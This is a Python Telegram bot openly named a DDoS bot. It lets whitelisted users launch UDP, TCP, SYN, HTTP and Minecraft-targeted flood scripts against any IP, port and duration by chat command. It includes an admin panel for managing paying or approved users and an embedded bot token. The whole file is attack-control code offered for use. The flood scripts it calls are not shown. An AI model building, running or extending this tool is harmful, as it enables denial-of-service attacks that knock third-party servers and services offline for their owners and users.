#!/usr/bin/env python3
"""
💀 DDOS BOT v10.0 - SCRIPT BASED 💀
"""

import telebot
import subprocess
import os
import threading
import time
import sys
import re

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8552745024:AAGF5KQ8Y5H-s0UqphhvKIaoZso2LSXouA")
ADMIN_IDS = os.getenv("ADMIN_IDS", "8908646607").split(",")
USER_FILE = "users.txt"

allowed_users = []
running_attacks = {}
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

# ========== ATTACK SCRIPT MAP ==========
ATTACK_SCRIPTS = {
    'udp': ('attacks/udp.py', 500),
    'tcp': ('attacks/tcp.py', 300),
    'syn': ('attacks/syn.py', 300),
    'httpflood': ('attacks/httpflood.py', 200),
    'tudp': ('attacks/tudp.py', 1500),
    'mc': ('attacks/mc.py', 1000),
    'mcquery': ('attacks/mcquery.py', 800),
    'mchandshake': ('attacks/mchandshake.py', 600),
    'udpbypass': ('attacks/udpbypass.py', 1200),
    'tcpbypass': ('attacks/tcpbypass.py', 800),
    'gudp': ('attacks/gudp.py', 1500),
}

# ========== FUNCTIONS ==========

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")

def execute_attack(user_id, attack_type, target, port, duration):
    if not 1 <= port <= 65535:
        return False, "Port must be 1-65535"
    if not 1 <= duration <= 600:
        return False, "Duration must be 1-600 seconds"

    if attack_type not in ATTACK_SCRIPTS:
        return False, f"Unknown attack: {attack_type}"

    script_path, threads = ATTACK_SCRIPTS[attack_type]

    if not os.path.exists(script_path):
        return False, f"Script not found: {script_path}"

    try:
        cmd = ["python3", script_path, target, str(port), str(duration), str(threads)]
        
        def run_attack():
            try:
                subprocess.run(cmd, check=True, capture_output=True, text=True)
            except:
                pass

        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()

        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append((thread, attack_type, target, port, duration, threads))

        return True, f"✅ {attack_type.upper()} attack started on {target}:{port} for {duration}s with {threads} threads"

    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id):
    with lock:
        if user_id not in running_attacks:
            return 0
        count = len(running_attacks[user_id])
        running_attacks[user_id] = []
        return count

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v10.0 💀

🔥 ATTACKS:
/udp <target> <port> <time> - UDP Flood
/tcp <target> <port> <time> - TCP Flood
/syn <target> <port> <time> - SYN Flood
/httpflood <target> <port> <time> - HTTP Flood
/tudp <target> <port> <time> - TUDP Monster
/mc <target> <port> <time> - Minecraft Attack
/mcquery <target> <port> <time> - Minecraft Query
/mchandshake <target> <port> <time> - Minecraft Handshake
/udpbypass <target> <port> <time> - UDP Bypass
/tcpbypass <target> <port> <time> - TCP Bypass
/gudp <target> <port> <time> - GUDP Flood

🛑 CONTROL:
/stopall - Stop attacks
/status - Check attacks
/id - Get your ID
/check - Check attack status

Example: /udp 8.8.8.8 53 10""")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, """💀 COMMANDS 💀

/udp 1.2.3.4 80 60
/tcp 1.2.3.4 80 60
/syn 1.2.3.4 80 60
/httpflood 1.2.3.4 80 60
/tudp 1.2.3.4 80 60
/mc 1.2.3.4 25565 60
/mcquery 1.2.3.4 25565 60
/mchandshake 1.2.3.4 25565 60
/udpbypass 1.2.3.4 80 60
/tcpbypass 1.2.3.4 80 60
/gudp 1.2.3.4 80 60

/stopall - Stop attacks
/status - Check attacks
/id - Get your ID
/check - Check attack status
/admin - Admin panel""")

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks or not running_attacks[user_id]:
            bot.reply_to(message, "📭 No active attacks")
            return
        attacks = running_attacks[user_id]
        msg = f"🔥 ACTIVE ATTACKS ({len(attacks)})\n\n"
        for i, (thread, attack_type, target, port, duration, threads) in enumerate(attacks, 1):
            msg += f"{i}. {attack_type.upper()} → {target}:{port}\n"
            msg += f"   ⏱️ Duration: {duration}s | 🧵 Threads: {threads}\n"
        bot.reply_to(message, msg)

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count = stop_user_attacks(user_id)
    bot.reply_to(message, f"✅ Stopped {count} attack(s)")

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_users and user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Not authorized")
        return
    
    result = subprocess.getoutput("ps aux | grep -E 'python3.*attacks/.*\\.py' | grep -v grep")
    if result:
        response = f"🟢 ATTACK RUNNING!\n\n{result[:300]}"
    else:
        response = "🔴 No attack running"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    bot.reply_to(message, """👑 ADMIN:
/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(USER_FILE, "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        try:
            info = bot.get_chat(int(uid))
            username = f"@{info.username}" if info.username else "Unknown"
            response += f"• {username} (ID: {uid})\n"
        except:
            response += f"• ID: {uid}\n"
    bot.reply_to(message, response)

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return

        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
            return

        target = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except:
            bot.reply_to(message, "❌ Port and time must be numbers")
            return

        status_msg = bot.reply_to(message, f"⚡ Starting {attack_type.upper()} attack...")
        success, msg = execute_attack(user_id, attack_type, target, port, duration)
        
        if success:
            bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
        else:
            bot.edit_message_text(f"❌ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)

    return handler

# Register all attacks
attacks = ['udp', 'tcp', 'syn', 'httpflood', 'tudp', 'mc', 'mcquery', 'mchandshake', 'udpbypass', 'tcpbypass', 'gudp']
for attack in attacks:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("=" * 50)
    print("💀 DDOS BOT v10.0 - SCRIPT BASED 💀")
    print("=" * 50)
    
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
    print("=" * 50)
    print("[+] Bot running! Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
